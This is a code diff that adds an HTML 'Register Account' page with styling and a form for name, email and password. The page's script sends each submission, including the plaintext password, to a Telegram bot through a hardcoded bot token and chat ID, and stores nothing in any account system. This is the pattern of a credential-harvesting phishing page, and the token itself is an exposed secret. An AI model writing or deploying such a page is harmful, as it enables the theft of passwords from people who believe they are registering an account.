@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register Account</title>
+    <style>
+        body {
+            background-image: url('https://t3.ftcdn.net/jpg/02/77/63/00/240_F_277630044_fDaatUvU2Bf1m1rCuO8DruD5uUHBoUwK.jpg');
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+        }
+
+        .box {
+            display: flex;
+            justify-content: center;
+            margin-top: 200px;
+        }
+
+        .form-register {
+            border: 1px solid black;
+            width: 30%;
+            height: auto;
+            border-radius: 10px;
+            background-color: rgba(0,0,0,0.5);
+            padding: 20px;
+        }
+
+        .form-register h2 {
+            text-align: center;
+            color: white;
+        }
+
+        .form-text {
+            text-align: center;
+        }
+
+        .btn button {
+            border: none;
+            padding: 15px 20px;
+            background-color: greenyellow;
+            border-radius: 10px;
+            font-size: 18px;
+            transition: background-color .3s;
+            width: 60%;
+            cursor: pointer;
+        }
+
+        .btn button:hover {
+            background-color: green;
+            color: white;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 70%;
+            border-radius: 10px;
+            padding: 12px;
+            border: none;
+            background-color: cornsilk;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            font-size: 16px;
+            outline: none;
+        }
+
+        /* ===== Responsive Design ===== */
+        @media (max-width: 768px) {
+            .form-register {
+                width: 90%;
+                margin-top: -90px;
+            }
+
+            input[type="text"],
+            input[type="email"],
+            input[type="password"] {
+                width: 80%;
+            }
+
+            .btn button {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-box">
+        <div class="box">
+            <div class="form-register">
+                <h2>Register Account</h2>
+                <form class="form-text" id="registerForm">
+                    <input type="text" id="name" placeholder="Enter Full Name" required><br><br>
+                    <input type="email" id="email" placeholder="Enter Email" required><br><br>
+                    <input type="password" id="password" placeholder="Enter Password" required><br><br>
+                    <div class="btn">
+                        <button type="submit" id="btn">Register</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8326445763:AAEhryKL60bbSe0Y-YDYs2SPEM6XDW26cDw";
+        const CHAT_ID = "7176789176";
+        const URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        document.getElementById("registerForm").addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            const name = document.getElementById("name").value.trim();
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+
+            if (!name || !email || !password) {
+                alert("សូមបំពេញព័ត៌មានអោយពេញលេញ!");
+                return;
+            }
+
+            const message = `<b>Register Form</b>\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;
+
+            fetch(URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                }),
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("បញ្ជូនទិន្នន័យជោគជ័យទៅ Telegram!");
+                    document.getElementById("registerForm").reset();
+                } else {
+                    alert("បញ្ជូនបរាជ័យ!");
+                }
+            })
+            .catch(err => {
+                alert("មានបញ្ហា ខណៈពេលបញ្ជូនទិន្នន័យ!");
+                console.error(err);
+            });
+        });
+    </script>
+</body>
+</html>
